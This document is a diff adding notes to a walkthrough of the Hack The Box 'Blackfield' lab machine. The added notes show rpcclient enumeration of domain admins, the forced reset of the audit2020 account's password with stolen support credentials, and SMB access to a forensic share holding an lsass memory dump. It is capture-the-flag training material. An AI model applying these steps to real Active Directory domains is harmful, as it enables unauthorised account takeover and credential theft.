@@ -58,7 +58,87 @@ user:[audit2020] rid:[0x44f]
 user:[support] rid:[0x450]
 user:[svc_backup] rid:[0x585]
 user:[lydericlefebvre] rid:[0x586]
+└─# rpcclient -U 'blackfield/support%#00^BlackKnight' 10.10.10.192
+rpcclient $> enumalsgroups builtin
+group:[Server Operators] rid:[0x225]
+group:[Account Operators] rid:[0x224]
+group:[Administrators] rid:[0x220]
+group:[Access Control Assistance Operators] rid:[0x243]
+group:[Remote Management Users] rid:[0x244]
+group:[Storage Replica Administrators] rid:[0x246]
 
+Query rids for admin and remote management users:
+rpcclient $> queryaliasmem builtin 0x244
+	sid:[S-1-5-21-4194615774-2175524697-3563712290-1413]
+rpcclient $> queryaliasmem builtin 0x220
+	sid:[S-1-5-21-4194615774-2175524697-3563712290-500]
+	sid:[S-1-5-21-4194615774-2175524697-3563712290-519]
+	sid:[S-1-5-21-4194615774-2175524697-3563712290-512]
+	
+Looking up the sids:
+rpcclient $> lookupsids S-1-5-21-4194615774-2175524697-3563712290-1413
+S-1-5-21-4194615774-2175524697-3563712290-1413 BLACKFIELD\svc_backup (1)
+rpcclient $> lookupsids S-1-5-21-4194615774-2175524697-3563712290-500
+S-1-5-21-4194615774-2175524697-3563712290-500 BLACKFIELD\Administrator (1)
+rpcclient $> lookupsids S-1-5-21-4194615774-2175524697-3563712290-519
+S-1-5-21-4194615774-2175524697-3563712290-519 BLACKFIELD\Enterprise Admins (2)
+rpcclient $> lookupsids S-1-5-21-4194615774-2175524697-3563712290-512
+S-1-5-21-4194615774-2175524697-3563712290-512 BLACKFIELD\Domain Admins (2)
 
+There was a forensic share, and so we query the audit2020 user account:
+rpcclient $> queryuser audit2020
+	User Name   :	audit2020
+	Full Name   :	
+	Home Drive  :	
+	Dir Drive   :	
+	Profile Path:	
+	Logon Script:	
+	Description :	
+	Workstations:	
+	Comment     :	
+	Remote Dial :
+	Logon Time               :	Thu, 01 Jan 1970 03:00:00 EAT
+	Logoff Time              :	Thu, 01 Jan 1970 03:00:00 EAT
+	Kickoff Time             :	Thu, 01 Jan 1970 03:00:00 EAT
+	Password last set Time   :	Tue, 22 Sep 2020 01:35:06 EAT
+	Password can change Time :	Wed, 23 Sep 2020 01:35:06 EAT
+	Password must change Time:	Thu, 14 Sep 30828 05:48:05 EAT
+	unknown_2[0..31]...
+	user_rid :	0x44f
+	group_rid:	0x201
+	acb_info :	0x00000210
+	fields_present:	0x00ffffff
+	logon_divs:	168
+	bad_password_count:	0x00000000
+	logon_count:	0x00000000
+	padding1[0..7]...
+	logon_hrs[0..21]...
+
+I see a message in the light that password must change. Now I need to attempt to set a new password for this account.
+
+└─# net rpc password audit2020 -U 'blackfield/support%#00^BlackKnight' -S 10.10.10.192
+Enter new password for audit2020: Password01%
+
+└─# smbclient -U 'audit2020%Password01%' //10.10.10.192/forensic
+Try "help" to get a list of possible commands.
+smb: \> recurse
+smb: \> dir
+  .                                   D        0  Sun Feb 23 16:03:16 2020
+  ..                                  D        0  Sun Feb 23 16:03:16 2020
+  commands_output                     D        0  Sun Feb 23 21:14:37 2020
+  memory_analysis                     D        0  Thu May 28 23:28:33 2020
+  tools                               D        0  Sun Feb 23 16:39:08 2020
+
+\commands_output
+  domain_admins.txt                   A      528  Sun Feb 23 16:00:19 2020
+  domain_groups.txt                   A      962  Sun Feb 23 15:51:52 2020
+  domain_users.txt                    A    16454  Sat Feb 29 01:32:17 2020
+  tasklist.txt                        A     9990  Sun Feb 23 15:54:29 2020
+
+\memory_analysis
+  lsass.zip                           A 41936098  Thu May 28 23:25:08 2020
+  
+ 
+  
 Reference:
 https://hackso.me/blackfield-htb-walkthrough/#smb-enumeration
